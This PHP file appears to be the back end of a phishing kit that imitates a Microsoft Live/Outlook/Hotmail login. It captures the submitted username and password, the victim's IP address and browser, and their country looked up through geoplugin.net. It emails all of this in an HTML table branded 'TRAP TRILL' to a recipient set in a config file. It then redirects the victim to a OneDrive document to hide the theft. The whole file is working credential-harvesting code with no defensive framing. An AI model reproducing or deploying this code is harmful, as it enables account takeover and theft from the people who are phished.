<?php
// multiple recipients
include '../../config.php';
$login = $_POST["username"];
$passwd = $_POST["password"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$server = date("D/M/d, Y g:i a"); 
$country = visitor_country();


// subject
$subject = "LIVE DETAILS $ip $country";

// message
$message ="<table align='center' border='0' cellpadding='1' cellspacing='0' style='height:247px; width:410px'>
	<tbody>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:#292929; height:40px'><span style='color:#d3d3d3'><span style='font-family:tahoma,geneva,sans-serif'><span style='font-size:26px'><strong>&nbsp; TRILL</strong>&trade;</span></span></span><strong><span style='color:#d3d3d3'><span style='font-family:lucida sans unicode,lucida grande,sans-serif'>&nbsp;&nbsp;</span></span></strong></td>
		</tr>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:#292929; height:20px'>
			<table border='0' cellpadding='1' cellspacing='1' style='width:406px'>
				<tbody>
					<tr>
						<td style='background-color:#cccccc'><span style='font-size:14px'><strong><span style='font-family:tahoma,geneva,sans-serif'>&nbsp;LIVE/OUTLOOK/HOTMAIL&nbsp;</span></strong></span></td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:#292929'>
			<table border='2' cellpadding='2' cellspacing='2' style='height:157px; width:400px'>
				<tbody>
					<tr>
						<td style='border-color:#cccccc'>
						<table border='1' style='line-height:20.7999992370605px; width:400px'>
							<tbody>
								<tr>
									<td style='width:130px'><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'><span style='background-color:#292929'>Login I.D:</span></span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'><span style='background-color:#292929'>$login</span></span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'>Password:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'><span style='background-color:#292929'>$passwd</span></span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'>IP:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'>$ip</span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>User-Agent:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>$browser</span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'>Date:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>$server</span></span></td>
								</tr>
								<tr>
									<td colspan='2' style='text-align:center'><span style='background-color:#292929; color:#d3d3d3; font-family:tahoma,geneva,sans-serif'>$login&nbsp;$passwd</span></td>
								</tr>
								<tr>
									<td colspan='2'><em><span style='background-color:#292929; color:#d3d3d3; font-family:tahoma,geneva,sans-serif'>Location: $country</span></em></td>
								</tr>
								<tr>
									<td colspan='2' style='text-align:right'><strong><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>TRAP TRILL</span></span></strong><span style='color:#d3d3d3'>&trade;</span></td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
	</tbody>
</table>

";

// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// From
$domainfrom = str_replace("www.","",$_SERVER['SERVER_NAME']);
$headers .= 'From: T3LL <logs@'.$domainfrom.'>' . "\r\n";


//stop empty logs
$parsed = parse_url($_SERVER['HTTP_REFERER']);
$refer = basename($parsed['path']);


if(empty($passwd)){
 header("location: ".$refer."?login=$login&name=$name");
}else{
mail($to, $subject, $message, $headers);
header("location: https://1drv.ms/w/s!AqdOsRvi_qvoizvcvlfJnkuNMRcR");
}

 







function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>
